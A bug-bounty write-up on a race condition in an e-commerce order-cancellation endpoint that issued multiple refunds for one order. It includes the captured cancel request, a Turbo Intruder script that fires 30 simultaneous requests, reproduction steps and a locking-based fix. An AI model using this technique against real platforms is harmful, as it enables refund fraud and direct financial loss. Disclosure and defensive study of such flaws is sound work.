---
date: 2025-07-12
title: "Race Condition in Order Cancellation Leads to Financial Fraud and Unlimited Refunds"
template: post
slug: Race Condition-in-Order-Cancellation-Leads-to-Financial-Fraud-and-Unlimited-Refunds
categories:
  - Technical
tags:
  - bug-bounty

---

What up, fellow hackers and bug bounty hunters! Today, I'm breaking down a classic but highly impactful vulnerability: a Race Condition in a financial transaction flow. This is a story of how a flaw in the order cancellation logic on a major e-commerce platform allowed me to receive multiple, unauthorized refunds for a single purchase, resulting in a direct financial loss for the platform and a high-severity bounty.

## The Discovery: The Influencer Marketing Cancellation

I was testing the platform's "Influencer Marketing" feature, which allows users to purchase services from influencers. After completing a purchase, the platform provides a convenient option to cancel the order and receive an immediate refund to the user's internal wallet.

The process is simple:

1.  Purchase a service.
2.  Click the "Cancel Order" button.
3.  The system processes the cancellation and refunds the full amount to the user's wallet.

I captured the cancellation request in Burp Suite. It was a `POST` request to `/api/v1/orders/cancel`:

```http
POST /api/v1/orders/cancel HTTP/2
Host: api.vulnerable-platform.dev
Authorization: Bearer <USER_JWT>
Content-Type: application/json

{
  "order_id": "699506686",
  "reason": "Changed my mind"
}
```

This is a critical area for security testing. Any process that involves a state change (from "paid" to "canceled") and a financial transaction (a refund) is a prime target for a Race Condition attack.

## The Vulnerability: The Unprotected Refund Logic

A Race Condition occurs when a system's output is dependent on the sequence or timing of uncontrollable events. In this case, the system was failing to properly lock the transaction record before processing the refund.

The expected flow is:

1.  **Check**: Is the order eligible for a refund? (Yes, it's paid and not yet canceled).
2.  **Lock**: Lock the order record to prevent concurrent changes.
3.  **Process**: Issue the refund.
4.  **Update**: Change the order status to "Canceled" and mark it as "Refunded."
5.  **Unlock**: Release the order record.

The vulnerability was that the system was missing or had an ineffective **Lock** mechanism. This allowed an attacker to send multiple, identical cancellation requests to the server simultaneously.

## The Exploitation: Turbo Intruder Attack

To exploit this, I used Burp Suite's Turbo Intruder extension, which is perfect for race condition attacks. Here's the Python script I used:

```python
# From https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

Here's how the attack worked:

1.  **Capture Request**: I initiated the cancellation process and captured the HTTP request in Burp Suite.
2.  **Send to Turbo Intruder**: I sent the request to Turbo Intruder.
3.  **Configure the Attack**: I pasted the Python script above into Turbo Intruder. This script is designed to send 30 identical requests as close together as possible.
4.  **Launch the Attack**: I launched the attack. The goal was to have multiple requests pass the initial **Check** (Is the order eligible for a refund?) before the first request could complete the **Update** step (Change status to "Canceled").


The server, receiving 30 requests at the same time, processed the refund logic for several of them before the order status was updated. I was able to get 5-10 refunds for a single order in my tests.

## The Impact: Financial Fraud and Scalable Loss

The attack was highly successful. For a single purchase, I was able to receive multiple refunds, significantly inflating the balance in my internal wallet.

*   **Direct Financial Loss**: The platform suffered a direct financial loss for every unauthorized refund processed.
*   **Scalable Fraud**: The attack could be automated and scaled. An attacker could make a large purchase, exploit the race condition to receive 10x the refund, and then use the inflated wallet balance to purchase other goods or services on the platform.

## Steps to Reproduce

1.  **Purchase a service** to get a valid `order_id`.
2.  **Capture the cancellation request** for that order in Burp Suite.
3.  **Send the request to Turbo Intruder** and use the Python script above to send multiple, simultaneous requests.
4.  **Launch the attack**.
5.  **Check your wallet balance**. You will see that you have been refunded multiple times for the same order.

## The Fix

The fix for a Race Condition in a financial transaction is to implement a robust concurrency control mechanism:

*   **Transaction Locking**: The system must implement a database-level transaction lock on the order record before the eligibility check and hold that lock until the order status is updated to "Canceled" and the refund is fully processed.
*   **Atomic Operations**: The check, refund, and status update operations should be grouped into a single, atomic database transaction. If any part of the transaction fails, the entire transaction must be rolled back.

## Conclusion

This vulnerability is a powerful reminder that in modern, highly concurrent web applications, logic flaws related to timing can be just as dangerous as traditional injection flaws. Any time a user action triggers a state change and a financial transaction, developers must assume multiple requests will arrive simultaneously. Implementing proper database locking and atomic transactions is non-negotiable for maintaining the integrity of a platform's financial health. Happy hacking!
